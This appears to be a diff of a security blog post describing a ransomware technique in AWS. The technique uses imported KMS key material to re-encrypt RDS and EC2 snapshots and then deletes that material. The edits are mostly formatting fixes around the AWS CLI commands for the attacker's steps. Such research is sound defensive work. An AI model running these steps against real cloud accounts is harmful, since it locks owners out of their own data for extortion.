@@ -96,7 +96,9 @@ aws kms create-key --key-usage ENCRYPT_DECRYPT --key-spec SYMMETRIC_DEFAULT --or
 
 Retrieve parameters for import, this is so you can save the import token and public key. These are temporary and must be used together. Ensure to Base64 decode them to get the raw binary input. 
 
-```aws kms get-parameters-for-import --key-id <key-id> --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048```
+```
+aws kms get-parameters-for-import --key-id <key-id> --wrapping-algorithm RSAES_OAEP_SHA_1 --wrapping-key-spec RSA_2048
+```
 
 ![image3](/img/kms-ransomware/get-params-for-import.png){: width="720" .mx-auto .d-block }
 
@@ -142,16 +144,17 @@ At this point the new material won't be active yet. It will be in the state `Pen
 
 ![image6](/img/kms-ransomware/pending-rotation.png){: width="720" .mx-auto .d-block }
 
+Then to actually rotate the key:
+
 ```
 aws kms rotate-key-on-demand --key-id <KEY_ID>
-
 ```
 
 The caveat here is that rotating on demand can only be done 10 times per key. This is also exclusive to single-region, symmetric keys. Additionally, once the current imported material is deleted, you cannot rotate the key again.
 
 ### **RDS**
 
-For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to *overwrite* the existing encryption, taking control away from the customer.
+For this example, we are using a database that is already encrypted. With this technique, the attacker will be able to*overwrite*the existing encryption, taking control away from the customer.
 
 ![image7](/img/kms-ransomware/db-console.png){: width="720" .mx-auto .d-block }
 
@@ -163,7 +166,7 @@ The first thing the attacker has to do is create a snapshot. It is not possible 
 aws rds create-db-snapshot --db-snapshot-identifier copy-pasturedb --db-instance-identifier pasturedb
 ``` 
 
-![image9](/img/kms-ransomware/copy-db-snapshot.png){: width="720" .mx-auto .d-block }
+![image9](/img/kms-ransomware/create-db-snapshot.png){: width="720" .mx-auto .d-block }
 
 Copy the DB Snapshot. In this step it is possible for an attacker to change the newly created snapshot encryption key to their own .   
 ```
@@ -217,7 +220,7 @@ aws ec2 copy-snapshot --region us-east-1 --source-region us-east-1 --source-snap
 
 ![image16](/img/kms-ransomware/ec2-copy-snapshot.png){: width="720" .mx-auto .d-block }
 
-Delete imported key material 
+Delete imported key material.
 
 ```
 aws kms delete-imported-key-material --key-id 8a5bf6e0-bc70-47fb-9d13-a98bb8afb5f2
